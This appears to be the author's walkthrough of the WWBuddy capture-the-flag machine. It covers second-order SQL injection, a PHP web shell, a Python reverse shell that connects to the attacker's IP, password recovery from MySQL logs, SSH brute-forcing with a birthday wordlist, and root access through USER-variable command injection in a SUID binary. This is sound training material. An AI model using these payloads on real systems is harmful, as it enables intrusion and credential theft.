---
layout: default
---
# WWBuddy official Writeup

## Enumeration

First we'll start scanning ports with nmap.

```
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 66:75:21:b4:93:4a:a5:a7:df:f4:01:80:19:cf:ff:ad (RSA)
|   256 a6:dd:30:3b:e4:96:ba:ab:5f:04:3b:9e:9e:92:b7:c0 (ECDSA)
|_  256 04:22:f0:d2:b0:34:45:d4:e5:4d:ad:a2:7d:cd:00:41 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.29 (Ubuntu)
| http-title: Login
|_Requested resource was http://192.168.0.111/login/
```

Port 22 and port 80 are open, lets take a look at the http server in port 80.

When we enter the site we can see a login page, and there's also an option to register a new account. What happens if we create an account and login?

Now we are able to see the index page.
There's 4 interesting things in the index page.
1. We can edit the username, country, e-mail, birthday and description of the user.
2. There's a chatbox, and in it there is a message sent by the user WWBuddy and we can also send messages.
3. There is a link to change our password.
4. We can click our username to go to a profile page.

Okay, now that we see this lets try to exploit something.

First lets enumerate the directories of the website. I'll use gobuster.

```
===============================================================
2020/07/28 21:48:56 Starting gobuster
===============================================================
/.htpasswd (Status: 403)
/.htpasswd.txt (Status: 403)
/.htpasswd.php (Status: 403)
/.htpasswd.html (Status: 403)
/.htaccess (Status: 403)
/.htaccess.html (Status: 403)
/.htaccess.txt (Status: 403)
/.htaccess.php (Status: 403)
/.hta (Status: 403)
/.hta.php (Status: 403)
/.hta.html (Status: 403)
/.hta.txt (Status: 403)
/admin (Status: 301)
/api (Status: 301)
/change (Status: 301)
/chat.php (Status: 200)
/config.php (Status: 200)
/footer.html (Status: 200)
/header.html (Status: 200)
/images (Status: 301)
/index.php (Status: 302)
/js (Status: 301)
/login (Status: 301)
/logout.php (Status: 302)
/index.php (Status: 302)
/profile (Status: 301)
/register (Status: 301)
/server-status (Status: 403)
/styles (Status: 301)
```

Let's enter /admin.

```
You dont have permissions to access this file, this incident will be reported.
```

Okay, we dont have permissions to enter the file, now we can try to check many ways to exploit the website.

## Exploit Website

I tried to do my best to not let any sqli os xss and some other things in the login, chat and in the user info, in this part i wanted to explore second order sql injection.

Okay, we can change the username, lets change it to some sqli payload like `' or 1=1 -- a` and then change the password.

If everything went right, the passwords of every user in the database now should be the same, but we dont have the username of another user to try to log in, or do we?

The WWBuddy bot sends a message to every user that is registered, so lets try to login with the username WWBuddy and the password that we just changed.

Logged in as WWBuddy we can see a 2 new faces, Henry and Roberto, first lets try to enter the /admin page... We still dont have permission, so lets try to login as one of the two.

I logged in as Roberto, he has some messages with Henry and by their messages, it looks like Henry is the admin, they are talking about changing the password used for new users in SSH and also about a new developer being hired, let's forget it for now and lets login with Henry because probably he will have rights to access /admin.

Logging in as Henry we can enter /admin, in it there's a log showing the ip, date, username and id of everytime anyone tried to access /admin page, lets look at the source of the page. 

Looking at the source we can see 2 interesting things, first there is the first flag and second, at the end of every line there is a &#x3C;br&#x3E; to break the line, okay, maybe the backend is using include() to show the logs, let's see if it executes php code.

Log in as a user that dont have rights to access the /admin page, change the username to some php code and try to access /admin page, then go back to Henry and in /admin page you can see the code was executed. Now go back to the user and change the username to this:

`<?php system($_GET["cmd"]) ?>`

Then setup a netcat listener and go back to /admin as Henry and in the url we can type some command to get a reverse shell. I use the python reverse shell from [PentestMonkey](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet).

```
http://<REMOTE_MACHINE_IP>/admin/?cmd=python%20-c%20%27import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%22<YOUR_VPN_IP>%22,1234));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);%20os.dup2(s.fileno(),2);p=subprocess.call([%22/bin/sh%22,%22-i%22]);%27
```

Okay we got a shell :DD

## Enumerate the machine

Okay lets enumerate the machine.

First lets search for suid files and we can find an interesting file called /bin/authenticate, lets run it.

```
$ authenticate
You need to be a real user to be authenticated.
```

We're not a real user ouch, okay lets see the hint for the second flag.

```
Some people have only one password ...
```

Some people have only one password, we could check the sql because we have the user and password for it, but we changed the passwords and even if we don't, the password is pretty strong so it's hard to crack the hash.

Okay then, lets execute linpeas to see if we can find something.

Near the end of the output we can find something.

```
[+] Finding passwords inside logs (limit 70)
/var/log/bootstrap.log: base-passwd depends on libc6 (>= 2.8); however:
/var/log/bootstrap.log: base-passwd depends on libdebconfclient0 (>= 0.145); however:
/var/log/bootstrap.log:Preparing to unpack .../base-passwd_3.5.44_amd64.deb ...
/var/log/bootstrap.log:Preparing to unpack .../passwd_1%3a4.5-1ubuntu1_amd64.deb ...
/var/log/bootstrap.log:Selecting previously unselected package base-passwd.
/var/log/bootstrap.log:Selecting previously unselected package passwd.
/var/log/bootstrap.log:Setting up base-passwd (3.5.44) ...
/var/log/bootstrap.log:Setting up passwd (1:4.5-1ubuntu1) ...
/var/log/bootstrap.log:Shadow passwords are now on.
/var/log/bootstrap.log:Unpacking base-passwd (3.5.44) ...
/var/log/bootstrap.log:Unpacking base-passwd (3.5.44) over (3.5.44) ...
/var/log/bootstrap.log:Unpacking passwd (1:4.5-1ubuntu1) ...
/var/log/bootstrap.log:dpkg: base-passwd: dependency problems, but configuring anyway as you requested:
/var/log/cloud-init.log:2020-07-24 19:31:06,764 - ssh_util.py[DEBUG]: line 123: option PasswordAuthentication added with yes
/var/log/cloud-init.log:2020-07-24 19:31:06,876 - cc_set_passwords.py[DEBUG]: Restarted the SSH daemon.
/var/log/cloud-init.log:2020-07-24 19:49:49,330 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
/var/log/cloud-init.log:2020-07-24 19:51:10,972 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
/var/log/cloud-init.log:2020-07-24 22:49:14,090 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
/var/log/cloud-init.log:2020-07-25 13:21:55,205 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
/var/log/cloud-init.log:2020-07-27 20:45:26,821 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
/var/log/cloud-init.log:2020-07-28 03:19:18,648 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
/var/log/cloud-init.log:2020-07-28 17:21:38,351 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
/var/log/cloud-init.log:2020-07-29 01:46:54,162 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
/var/log/cloud-init.log:2020-07-29 01:56:03,872 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
/var/log/dpkg.log:2020-02-03 18:22:20 configure base-passwd:amd64 3.5.44 3.5.44
/var/log/dpkg.log:2020-02-03 18:22:20 install base-passwd:amd64 <none> 3.5.44
/var/log/dpkg.log:2020-02-03 18:22:20 status half-configured base-passwd:amd64 3.5.44
/var/log/dpkg.log:2020-02-03 18:22:20 status half-installed base-passwd:amd64 3.5.44
/var/log/dpkg.log:2020-02-03 18:22:20 status installed base-passwd:amd64 3.5.44
/var/log/dpkg.log:2020-02-03 18:22:20 status unpacked base-passwd:amd64 3.5.44
/var/log/dpkg.log:2020-02-03 18:22:22 status half-configured base-passwd:amd64 3.5.44
/var/log/dpkg.log:2020-02-03 18:22:22 status half-installed base-passwd:amd64 3.5.44
/var/log/dpkg.log:2020-02-03 18:22:22 status unpacked base-passwd:amd64 3.5.44
/var/log/dpkg.log:2020-02-03 18:22:22 upgrade base-passwd:amd64 3.5.44 3.5.44
/var/log/dpkg.log:2020-02-03 18:22:25 install passwd:amd64 <none> 1:4.5-1ubuntu1
/var/log/dpkg.log:2020-02-03 18:22:25 status half-installed passwd:amd64 1:4.5-1ubuntu1
/var/log/dpkg.log:2020-02-03 18:22:25 status unpacked passwd:amd64 1:4.5-1ubuntu1
/var/log/dpkg.log:2020-02-03 18:22:26 configure base-passwd:amd64 3.5.44 <none>
/var/log/dpkg.log:2020-02-03 18:22:26 status half-configured base-passwd:amd64 3.5.44
/var/log/dpkg.log:2020-02-03 18:22:26 status installed base-passwd:amd64 3.5.44
/var/log/dpkg.log:2020-02-03 18:22:26 status unpacked base-passwd:amd64 3.5.44
/var/log/dpkg.log:2020-02-03 18:22:27 configure passwd:amd64 1:4.5-1ubuntu1 <none>
/var/log/dpkg.log:2020-02-03 18:22:27 status half-configured passwd:amd64 1:4.5-1ubuntu1
/var/log/dpkg.log:2020-02-03 18:22:27 status installed passwd:amd64 1:4.5-1ubuntu1
/var/log/dpkg.log:2020-02-03 18:22:27 status unpacked passwd:amd64 1:4.5-1ubuntu1
/var/log/dpkg.log:2020-02-03 18:23:09 configure passwd:amd64 1:4.5-1ubuntu2 <none>
/var/log/dpkg.log:2020-02-03 18:23:09 status half-configured passwd:amd64 1:4.5-1ubuntu1
/var/log/dpkg.log:2020-02-03 18:23:09 status half-configured passwd:amd64 1:4.5-1ubuntu2
/var/log/dpkg.log:2020-02-03 18:23:09 status half-installed passwd:amd64 1:4.5-1ubuntu1
/var/log/dpkg.log:2020-02-03 18:23:09 status installed passwd:amd64 1:4.5-1ubuntu2
/var/log/dpkg.log:2020-02-03 18:23:09 status unpacked passwd:amd64 1:4.5-1ubuntu1
/var/log/dpkg.log:2020-02-03 18:23:09 status unpacked passwd:amd64 1:4.5-1ubuntu2
/var/log/dpkg.log:2020-02-03 18:23:09 upgrade passwd:amd64 1:4.5-1ubuntu1 1:4.5-1ubuntu2
/var/log/installer/installer-journal.txt:Jul 24 19:13:35 ubuntu-server systemd[1]: Started Forward Password Requests to Wall Directory Watch.
/var/log/installer/installer-journal.txt:Jul 24 19:13:36 ubuntu-server systemd[1]: Started Dispatch Password Requests to Console Directory Watch.
/var/log/installer/installer-journal.txt:Jul 24 19:19:40 ubuntu-server usermod[13715]: change user 'sshd' password
/var/log/installer/installer-journal.txt:Jul 24 19:19:41 ubuntu-server chage[13720]: changed password expiry for sshd
/var/log/mysql/general.log:2020-07-25T14:41:25.299556Z	    8 Connect	Access denied for user 'root'@'localhost' (using password: YES)
/var/log/mysql/general.log:2020-07-25T14:41:25.309467Z	    9 Connect	Access denied for user 'root'@'localhost' (using password: YES)
/var/log/mysql/general.log:2020-07-25T14:41:25.317916Z	   10 Connect	Access denied for user 'root'@'localhost' (using password: NO)
/var/log/mysql/general.log:2020-07-25T15:01:40.143115Z	   12 Prepare	SELECT id, username, password FROM users WHERE username = ?
/var/log/mysql/general.log:2020-07-25T15:02:00.018975Z	   13 Prepare	SELECT id, username, password FROM users WHERE username = ?
/var/log/mysql/general.log:2020-07-25T15:02:00.019056Z	   13 Execute	SELECT id, username, password FROM users WHERE username = 'Roberto'

```

Okay, there is a log file for mysql called general.log and it looks like it shows every query executed in mysql, it worth taking a look at it.

```
2020-07-25T15:01:40.140340Z	   12 Connect	root@localhost on app using Socket
2020-07-25T15:01:40.143115Z	   12 Prepare	SELECT id, username, password FROM users WHERE username = ?
2020-07-25T15:01:40.143760Z	   12 Execute	SELECT id, username, password FROM users WHERE username = 'Roberto***************'
2020-07-25T15:01:40.147944Z	   12 Close stmt	
```

It looks like Roberto accidentaly typed his password in the username input, lets try ssh into the machine with "roberto" as user and "***************" as password. It works.

When we log in as roberto the first thing we find is a file called importante.txt lets read it.

```
A Jenny vai ficar muito feliz quando ela descobrir que foi contratada :DD

Não esquecer que semana que vem ela faz 26 anos, quando ela ver o presente que eu comprei pra ela, talvez ela até anima de ir em um encontro comigo.


THM{************}
```

There's our second flag. If you read this file it may look like gibberish to you, because it isn't in english, but what language is it?
Remember that in the website you can put your country? In Roberto's profile, it says that he is brazilian, if you don't know what language we speak in Brazil, google is your friend.
Ok obviously you can skip this part if you speak portuguese, but if you dont, with our newfound knowledge, let's put this text in google translate and see what the file says.

```
Jenny will be very happy when she finds out she was hired: DD

Do not forget that next week she turns 26, when she sees the gift I bought her, maybe she even encourages to go on a date with me.
```

Jenny will be 26 next week, wonderful, remember roberto and henry's messages from before?

We can discover her birthday, but when is it next week?

```
-rw-rw-r-- 1 roberto roberto  246 Jul 27 21:25 importante.txt
```

Info about the file, it was last modified in jul 27 so we go into 2020 calendar and search what week will be next week, the week starts in august 2 and ends august 8, and as we know she will be 26 so she was born in 1994, now we can make a wordlist with all possible passwords for jenny with different date formats.

Now we use hydra to bruteforce jenny ssh with the wordlist and we can discover her password.

But before entering in her account, lets execute that authenticate file because now we are a real user, aren't we?

```
You are already a developer.
```

So it seems the file changes the user's group.

Lets ssh as jenny, okay, we're in.

## Privilege escalation

Now before executing authenticate, lets use ghidra to see what it does.

```
undefined8 main(void)

{
  __uid_t __uid;
  int iVar1;
  char *__src;
  long in_FS_OFFSET;
  undefined8 local_48;
  undefined8 local_40;
  undefined8 local_38;
  undefined8 local_30;
  undefined8 local_28;
  undefined4 local_20;
  undefined local_1c;
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  __uid = getuid();
  if ((int)__uid < 1000) {
    puts("You need to be a real user to be authenticated.");
  }
  else {
    iVar1 = system("groups | grep developer");
    if (iVar1 == 0) {
      puts("You are already a developer.");
    }
    else {
      __src = getenv("USER");
      __uid = getuid();
      setuid(0);
      local_48 = 0x20646f6d72657375;
      local_40 = 0x6c6576656420472d;
      local_38 = 0x207265706f;
      local_30 = 0;
      local_28 = 0;
      local_20 = 0;
      local_1c = 0;
      strncat((char *)&local_48,__src,0x14);
      system((char *)&local_48);
      puts("Group updated");
      setuid(__uid);
      system("newgrp developer");
    }
  }
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return 0;
}
```

Okay, if your uid is over 1000 and you aren't in the developer group it gets the USER environment variable and changes your group.

Now, we can just change the environment variable to execute a shell in the system.

```
jenny@wwbuddy:~$ echo $USER
jenny
jenny@wwbuddy:~$ export USER="jenny; sh"
jenny@wwbuddy:~$ echo $USER
jenny; sh
jenny@wwbuddy:~$ authenticate
# cat /root/root.txt
THM{**********************}
```

There's the root flag.

This is the first room i've ever done, hope you liked it :D